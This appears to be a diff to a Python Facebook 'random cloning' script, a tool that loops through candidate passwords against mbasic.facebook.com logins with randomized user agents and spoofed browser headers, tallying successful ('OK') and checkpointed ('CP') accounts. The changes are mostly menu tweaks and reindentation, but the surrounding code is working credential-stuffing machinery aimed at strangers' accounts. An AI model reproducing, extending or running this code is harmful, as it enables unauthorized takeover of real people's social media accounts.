@@ -111,6 +111,7 @@ def DEVHISx():
 def Main():
         os.system("clear")
         print(logo)
+        print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
         print("\033[1;92m[1] BD RANDOM CLONING")
         print("\033[1;92m[2] INDIA RANDOM CLONING")
         print("\033[1;92m[3] JOIN FACEBOOK GROUP")
@@ -118,10 +119,8 @@ def Main():
         print("\033[1;92m[0] EXIT PROGRAMMING")
         print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
         DEVHIS =input("\n[?] Choose : ")
-        if DEVHIS in ["1","01"]:
+        if DEVHIS in ["1","01","2"]:
             fuck()
-       if DEVHIS in ["2","02"]:
-            exit()
         if DEVHIS in ["3","03"]:
             os.system('xdg-open https://www.facebook.com/group/')
         if DEVHIS in ["4","04"]:
@@ -130,7 +129,6 @@ def Main():
             exit()
         else:
             exit()
-            
 def fuck():
     user=[]
     os.system('clear')
@@ -174,7 +172,7 @@ def DEVHIS2(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            sys.stdout.write(f'\r\033[1;92m[RUNNING]▶ [\033[1;37m%s/%s\033[0m\033[1;32m]  [OK-%s] ~ [CP-%s] \r'%(loop,tl,len(oks),len(cps))),
+            sys.stdout.write(f'\r\033[1;92m[RUNNING]▶ [\033[1;37m%s/%s\033[0m\033[1;32m] [OK-%s] ~ [CP-%s] \r'%(loop,tl,len(oks),len(cps))),
             sys.stdout.flush()
             free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
@@ -188,14 +186,14 @@ def DEVHIS2(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             header_freefb = {'authority': 'mbasic.facebook.com',
-     'method': 'GET',
-    'scheme': 'https',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en-GB;q=0.9,en;q=0.8',
-    'cache-control': 'max-age=0',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+            'method': 'GET',
+            'scheme': 'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en-GB;q=0.9,en;q=0.8',
+            'cache-control': 'max-age=0',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
     'sec-ch-ua-mobile': '?0',
     'sec-ch-ua-platform': '"Linux"',
     'sec-ch-ua-platform-version': '""',
